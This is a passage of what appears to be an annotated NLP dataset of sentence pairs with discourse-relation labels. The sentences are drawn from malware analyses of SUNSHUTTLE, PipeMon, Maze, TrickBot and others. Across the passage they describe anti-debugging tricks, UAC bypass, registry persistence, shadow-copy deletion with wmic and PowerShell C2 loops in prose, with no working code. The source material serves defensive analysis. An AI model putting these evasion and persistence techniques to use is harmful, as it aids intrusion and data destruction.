        "S1": "Inside the \u201c\ufeffmain_request_session_key\u201d routine, SUNSHUTTLE constructs an HTTPS request to its configured C2.",
        "S2": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Upon an HTTP 200 response from the request, the response data from the C2 is expected to not contain the following string for the sample analyzed: ywQdjLuHHC",
        "S2": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "relation": "NEXT"
    },
    {
        "S1": "The request_session_key routine returns a 1 if the string is not in the response and a -1 if it is in the response.",
        "S2": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the result of the request_session_key is 1, SUNSHUTTLE will execute the retrieve_session_key routine.",
        "S2": "The decrypted content is likely a session key used to encrypt content once SUNSHUTTLE transitions to its command-and-control routines.",
        "relation": "NEXT"
    },
    {
        "S1": "The retrieve_session_key routine again contacts the C2 and downloads content that is expected to be decrypted by the aforementioned embedded private key.",
        "S2": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "relation": "NEXT"
    },
    {
        "S1": "Once a session key is retrieved from the C2, SUNSHUTTLE begins the beaconing and \u201cresolve_command\u201d routines in a loop.",
        "S2": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "relation": "NEXT"
    },
    {
        "S1": "Available commands include remotely updating its configuration, file upload and download, and arbitrary command execution.",
        "S2": "After successful execution of the malware, it drops the following files to the victim\u2019s system: <current_directory>\\config.dat.tmp (MD5: Dynamic) Encrypted configuration file",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "S2": "A check is performed to ensure the decrypted content doesn\u2019t contain the following string: Cp5RTQ31R1",
        "relation": "NEXT"
    },
    {
        "S1": "The content returned from the C2 after the \u201cmain_beaconing\u201d routine is Base64 decoded and AES decrypted",
        "S2": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "S2": "The following is an example request to the C2 from the \u201crequest_session_key\u201d routine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "SUNSHUTTLE uses the cookie header to pass values to the C2.",
        "S2": "The cookie headers vary slightly depending on the operation being performed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The previous research noted that the malware deploys a novel trick to prevent MS Office attempting to launch the disguised app as a doc by embedding a unicode character in the file name.",
        "S2": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "relation": "ELABORATION"
    },
    {
        "S1": "On launch, the malware switches out the malicious application bundle for an actual MS Office doc: the same file name is used but now minus the hidden Unicode character.",
        "S2": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "relation": "MISC"
    },
    {
        "S1": "The whole trick is invisible to the user, who only sees a document appearing with the same name as the one they double-clicked on.",
        "S2": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "relation": "NEXT"
    },
    {
        "S1": "That trick is accompanied by the borrowing of a technique that has become popular among commodity adware and malware distributors; namely, using a shell script both as the main executable inside the app bundle and also as a vehicle to drop an embedded base64-encoded payload.",
        "S2": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Importantly, prior to line 40, the script takes measures to deal with two macOS security features: App Translocation and file quarantine.",
        "S2": "In this case, the script agressively attempts to remove all quarantine bits and, in the event any of those fail and the malware finds itself translocated to a read-only filepath, it then undertakes a hunt for the original downloaded file via its MD5 hash and attempts to execute it from its non-translocated path on disk.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The second stage payload, once dumped from the encoded base64, is a universal FAT binary containing Mach-Os for i386 and x86_64 architectures.",
        "S2": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As earlier research pointed out, this stage is responsible for dropping a persistence agent with the label of \u201ccom.apple.marcoagent.voiceinstallerd\u201d and its program argument, \u201cmount_devfs\u201d.",
        "S2": "A further point not mentioned in the earlier research is that the Launch Agent or Launch Daemon is written using the \u201cHidden\u201d flag so that users won\u2019t see it in the Finder by default.",
        "relation": "MISC"
    },
    {
        "S1": "However, we also note that this stage has code for testing the UID and determining whether the executable is being run as root or not.",
        "S2": "According to the earlier research, the malicious \u201cmount_devfs\u201d file provides the actors with backdoor capabilities, which include the ability to exfiltrate information as well as download files to the target machine.",
        "relation": "MISC"
    },
    {
        "S1": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*",
        "S2": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "relation": "NEXT"
    },
    {
        "S1": "Once written to disk, the RARSFX is executed with CreateProcess by providing the decryption password in an argument, as follows: setup0.exe -p*|T/PMR{|T2^LWJ*",
        "S2": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "relation": "NEXT"
    },
    {
        "S1": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "S2": "Further, not all these files are necessarily present in the archive, depending on the installer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The content of the RARSFX is then extracted into %TMP%\\RarSFX0 and consists of the following files:",
        "S2": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "- PrintDialog.exe \u2013 Legitimate Windows executable used to load PrintDialog.dll",
        "S2": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:",
        "relation": "MISC"
    },
    {
        "S1": "- setup.dll \u2013 Installation DLL",
        "S2": "Once extracted, setup.exe is executed without arguments.",
        "relation": "NEXT"
    },
    {
        "S1": "Its sole purpose is to load setup.dll using LoadLibraryA.",
        "S2": "setup.exe is executed without arguments by the RARSFX, and checks whether it\u2019s running with elevated privileges.",
        "relation": "NEXT"
    },
    {
        "S1": "If not, it will attempt to obtain such privileges using token impersonation if the version of Windows is below Windows 7 build 7601; otherwise it will attempt different UAC bypass techniques, allowing installation of the payload loader into one of:",
        "S2": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "relation": "MISC"
    },
    {
        "S1": "Note that we weren\u2019t able to retrieve samples related to Interactive.dll.",
        "S2": "This technique is really similar to the Print Monitor persistence technique (being used by DePriMon, for example) and, to our knowledge, has not been documented previously.",
        "relation": "MISC"
    },
    {
        "S1": "This loader is stored encrypted within setup.dll, which will decrypt it before writing it to the aforementioned location.",
        "S2": "setup.dll registers the malicious DLL loader as an alternative Print Processor by setting one of the following registry values: HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\Windows x64\\Print Processors\\PrintFiiterPipelineSvc\\Driver = \u201cDEment.dll\u201d or HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows x64\\Print Processors\\lltdsvc1\\Driver = \u201cEntAppsvc.dll\u201d",
        "relation": "ELABORATION"
    },
    {
        "S1": "After having registered the Print Processor, PipeMon restarts the print spooler service (spoolsv.exe).",
        "S2": "The whole PipeMon staging and persistence is shown in Figure 1.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware uses some tricks to detect debuggers at this point.",
        "S2": "If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.",
        "S2": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "relation": "MISC"
    },
    {
        "S1": "The malware gets all processes in the system but ignores the first one (the \u2018idle process\u2019 in Windows which is simply a tool to let the user know what percentage of system resources are being used).",
        "S2": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list.",
        "S2": "It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.",
        "relation": "NEXT"
    },
    {
        "S1": "A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:",
        "S2": "The malware will kill the process with the function \u201cTerminateProcess\u201d that it gets from the EAT (Export Address Table) of the module \u201ckernel32.dll\u201d to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function \u201cProcess32FirstW\u201d.",
        "S2": "This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the \u201cret\u201d opcode forces the function to return without creating it.",
        "relation": "MISC"
    },
    {
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "relation": "ELABORATION"
    },
    {
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "relation": "MISC"
    },
    {
        "S1": "When the function ends, Windows makes a \u201cret\u201d opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow.",
        "S2": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "relation": "MISC"
    },
    {
        "S1": "Another ploy utilized by the malware (depending of the sample) is to get the function \u201cDbgUIRemoteBreakin\u201d, using the function \u201cGetProcAddress\u201d, before employing a trick to avoid having a debugger attach to it in runtime[7].",
        "S2": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "relation": "MISC"
    },
    {
        "S1": "The trick used here is \u201cVirtualProtect\u201d to give the function memory address of \u201cDbgUIRemoteBreakin\u201d permission to write to it:",
        "S2": "This is done to avoid having a debugger attach to it in runtime.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of \u201cret\u201d) and restores the previous permissions with \u201cVirtualProtect\u201d, again in the same address and byte, removing the write permission.",
        "S2": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "relation": "NEXT"
    },
    {
        "S1": "This is done to avoid having a debugger attach to it in runtime.",
        "S2": "In brief, it prevents a debugger from being attached correctly.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "relation": "NEXT"
    },
    {
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).",
        "relation": "NEXT"
    },
    {
        "S1": "The malware checks the language of the machine with function \u201cGetUserDefaultUILanguage\u201d and saves the value in the stack; it is not checked automatically after the call, but it is important later.",
        "S2": "If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine.",
        "relation": "MISC"
    },
    {
        "S1": "Maze creates a mutex with the name \u201cGlobal\\x\u201d where x is a special value that is unique per machine.",
        "S2": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "relation": "NEXT"
    },
    {
        "S1": "The malware, after creating the mutex, makes calls to the function \u201cGetLastError\u201d to check against two errors:",
        "S2": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).",
        "S2": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the malware gets this error, it means that the mutex already exists in the system and can be accessed.",
        "S2": "After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU[8]).",
        "relation": "NEXT"
    },
    {
        "S1": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "S2": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware tries to delete the shadow volumes in the system using the \u201cwmic.exe\u201d program with the switches \u201cshadowcopy\u201d and \u201cdelete\u201d.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "S2": "For example, in the beginning it enters the folders \u201cydw\u201d and \u201cfdygg\u201d but later returns to the root of the Windows installation unit with two \u201c..\u201d commands that lead to \u201cC:\\\u201d in this case.",
        "relation": "ELABORATION"
    },
    {
        "S1": "As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except \u201cWindows\u201d, \u201csystem32\u201d and \u201cwbem\u201d.",
        "S2": "It later concatenates with the \u201cWindows\u201d folder and continues with the same behavior to finally enter into \u201csystem32\u201d where it calls the \u201cwmic.exe\u201d program with the switches to delete the shadow volumes.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "S2": "After the deletion process, the malware gets the function \u201cWow64RevertWow64FsRedirection\u201d using the function \u201cGetProcAddress\u201d and calls it in a dynamic way to leave the system in the same state as before.",
        "relation": "MISC"
    },
    {
        "S1": "This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.",
        "S2": "The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the \u201chost\u201d file in Windows.",
        "relation": "MISC"
    },
    {
        "S1": "In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": "NEXT"
    },
    {
        "S1": "Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": "NEXT"
    },
    {
        "S1": "Only the malware developers have the RSA private blob to decrypt their public RSA Blob.",
        "S2": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "relation": "NEXT"
    },
    {
        "S1": "This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function \u201cCryptGenRandom\u201d to avoid memory dumps but, later, it will need to be decrypted before use.",
        "S2": "The malware uses this agent to make the connection, but it can change between samples:",
        "relation": "MISC"
    },
    {
        "S1": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "S2": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "relation": "ELABORATION"
    },
    {
        "S1": "After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime.",
        "S2": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "relation": "MISC"
    },
    {
        "S1": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.",
        "S2": "- Check the existence of the file with the function \u201cSetFileAttributesW\u201d with the attribute \u201cFILE_ATTRIBUTE_ARCHIVE\u201d.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.",
        "S2": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "relation": "ELABORATION"
    },
    {
        "S1": "The procedure to crypt the files is easy, with the malware taking the following steps:",
        "S2": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "relation": "MISC"
    },
    {
        "S1": "- Reserve memory to the file with a call to \u201cVirtual Alloc\u201d for the key and iv.",
        "S2": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.",
        "relation": "NEXT"
    },
    {
        "S1": "- Open the file with read and write permissions with the function \u201cCreateFileW\u201d with the flag \u201cOPEN_EXISTING\u201d.",
        "S2": "- Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.",
        "relation": "NEXT"
    },
    {
        "S1": "- Rename the file with the function \u201cMoveFileExW\u201d.",
        "S2": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "relation": "NEXT"
    },
    {
        "S1": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "S2": "- The image of the file is unmapped, and handles closed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware does not delete the file using the function \u201cDeleteFileW\u201d and later create a new one with the crypted data.",
        "S2": "The list of folders that the malware avoids are:",
        "relation": "ELABORATION"
    },
    {
        "S1": "It creates the ransom note in each folder that it can.",
        "S2": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:",
        "S2": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.",
        "S2": "The malware uses this agent to make the connection, but it can change between samples:",
        "relation": "MISC"
    },
    {
        "S1": "The malware uses this agent to make the connection, but it can change between samples:",
        "S2": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "relation": "MISC"
    },
    {
        "S1": "It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else.",
        "S2": "The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.",
        "relation": "MISC"
    },
    {
        "S1": "Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:",
        "S2": "Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attack starts with a phishing email that contains a malicious link to a file hosted on Google Docs named \u201cAnnual Bonus Report.doc\u201d.",
        "S2": "This information is crucial, as it determines the course of the attack.",
        "relation": "MISC"
    },
    {
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "Most of the initial payloads in these campaigns are signed with valid certificates to evade security tools.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "relation": "MISC"
    },
    {
        "S1": "The campaigns use a TrickBot downloader that is signed and uses an icon to pretend it is a Microsoft Word document.",
        "S2": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "relation": "ELABORATION"
    },
    {
        "S1": "To avoid suspicion, the decoy message suggests the user should update Microsoft Word or open the file from another computer.",
        "S2": "The message box distracts the user as TrickBot\u2019s payload is downloaded, stored in the %TEMP% folder, and executed.",
        "relation": "ELABORATION"
    },
    {
        "S1": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "S2": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "relation": "MISC"
    },
    {
        "S1": "Once TrickBot\u2019s main payload is injected into the svchost.exe process, it carries out a series of reconnaissance-related tasks to profile the infected endpoint and the network.",
        "S2": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "relation": "NEXT"
    },
    {
        "S1": "This information is crucial, as it determines the course of the attack.",
        "S2": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot checks for Internet connectivity by trying to access several designated domains.",
        "S2": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "relation": "NEXT"
    },
    {
        "S1": "Once TrickBot verifies it can connect to the Internet, it communicates with C2 servers, some of which using TOR-related domains.",
        "S2": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "relation": "NEXT"
    },
    {
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "relation": "LIST"
    },
    {
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "relation": "ELABORATION"
    },
    {
        "S1": "After TrickBot establishes Internet access and sends information about the location of the target machine, it starts its malicious activity.",
        "S2": "core-parser.dll parses the TrickBot config files and extracts IP addresses for secondary C2 communication, redirection, and web injection logic.",
        "relation": "NEXT"
    },
    {
        "S1": "TrickBot sends the reconnaissance information from the target machine to a hardcoded C2 server.",
        "S2": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "relation": "NEXT"
    },
    {
        "S1": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "S2": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot also steals data from Internet Explorer by executing the built-in Windows tool ESENTUTL using the living-off-the-land technique (LOLBin).",
        "S2": "This variant of TrickBot employs a new, unique ability to steal passwords from KeePass, a free, open- source password manager.",
        "relation": "LIST"
    },
    {
        "S1": "Once it finds the dictionary key, it dumps all passwords as an output and sends the attackers the master password.",
        "S2": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "relation": "MISC"
    },
    {
        "S1": "TrickBot\u2019s stealer module also tries to extract keys from Filezilla, OpenSSH and OpenVPN.",
        "S2": "The threat actor gave considerable effort to obfuscating the code of this new Anchor_DNS variant using stack strings, string encryption, and by implementing a packer.",
        "relation": "MISC"
    },
    {
        "S1": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "S2": "The attacker also uses PowerShell to test DNS entry settings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "In addition to several crafted PowerShell commands, the attackers use several legitimate Windows processes to gather information, including nltest.exe, net.exe, ipconfig.exe, whoami.exe, and nslookup.exe.",
        "S2": "The attackers deploys a batch script that executes the ADfind.exe tool to enumerate users, groups, and computers of the Windows domain.",
        "relation": "ELABORATION"
    },
    {
        "S1": "They gather information on:",
        "S2": "The attacker also uses PowerShell to test DNS entry settings.",
        "relation": "ELABORATION"
    },
    {
        "S1": "The attacker also uses PowerShell to test DNS entry settings.",
        "S2": "The threat actor leverages PowerShell to send additional payloads to the target machine.",
        "relation": "MISC"
    },
    {
        "S1": "They use the shell to expand their search to other machines on the network by searching for things like a list of the domain controllers.",
        "S2": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "relation": "NEXT"
    },
    {
        "S1": "With this in mind, we gather that the attackers goal is to spread within organizations to multiple machines, not just to the target machine.",
        "S2": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "relation": "MISC"
    },
    {
        "S1": "The threat actor evaluates information sent back to the C2 server and identifies if they have successfully infected a high-value target.",
        "S2": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "relation": "NEXT"
    },
    {
        "S1": "They issue commands to fetch a payload from a secondary server and, once it\u2019s downloaded, immediately execute it on the target machine through PowerShell.",
        "S2": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "Many strings in the code have typos and grammatical mistakes, further affirming our suspicion that the authors of Anchor_DNS are not native english speakers.",
        "relation": "MISC"
    },
    {
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "However, in some instances of this attack, there was C2 server overlap between these infrastructures.",
        "relation": "MISC"
    },
    {
        "S1": "Though we were unable to fetch the script used in this specific incident, we were able to pivot off the query parameters used in the above PowerShell script (?a=irs&x=) to find a sandbox report for similar activity.",
        "S2": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "relation": "MISC"
    },
    {
        "S1": "The PowerShell payload runs two stages: the first stage sends basic information to the C2 domain and waits for a response to see if it should continue its operation.",
        "S2": "This information is sent to the C2 along with the `i` parameter.",
        "relation": "ELABORATION"
    },
    {
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "If it does, the PowerShell script stops executing and kills the task.",
        "relation": "IF_ELSE"
    },
    {
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "When a response is received, the payload checks to see if the response matches the value cex01.",
        "relation": "NEXT"
    },
    {
        "S1": "If the threat actor does not send a stop flag, the PowerShell script runs in a constant loop and continuously POSTs data to the same domain the payload was fetched from.",
        "S2": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "relation": "ELABORATION"
    },
    {
        "S1": "This information is sent to the C2 along with the `i` parameter.",
        "S2": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "relation": "MISC"
    },
    {
        "S1": "If it does, the PowerShell script stops executing and kills the task.",
        "S2": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "relation": "MISC"
    },
    {
        "S1": "If the response is any other value, the script sets a timeout variable based on the response and continues to the main loop.",
        "S2": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "relation": "NEXT"
    },
    {
        "S1": "This indicates that the attacker is either looking to target specific Windows domains or specific operating system versions.",
        "S2": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "relation": "MISC"
    },
    {
        "S1": "The main loop sends a POST request to the server with the `t` parameter, which requests the next commands from the server.",
        "S2": "The output of the command is sent back to the C2 server using a POST request with the \u201ca\u201d parameter.",
        "relation": "NEXT"
    },
    {
        "S1": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "S2": "The attackers use a Meterpreter implant to carry out post-exploitation actions.",
        "relation": "MISC"
    },
    {
        "S1": "Each line in the response from the threat actor contains a Base64-encoded command, which is decoded and then immediately executed using PowerShell through the Invoke-Expression (IEX) commandlet.",
        "S2": "The threat actor uses known Cobalt Strike modules to enumerate Active Directory information:",
        "relation": "MISC"
    },
    {
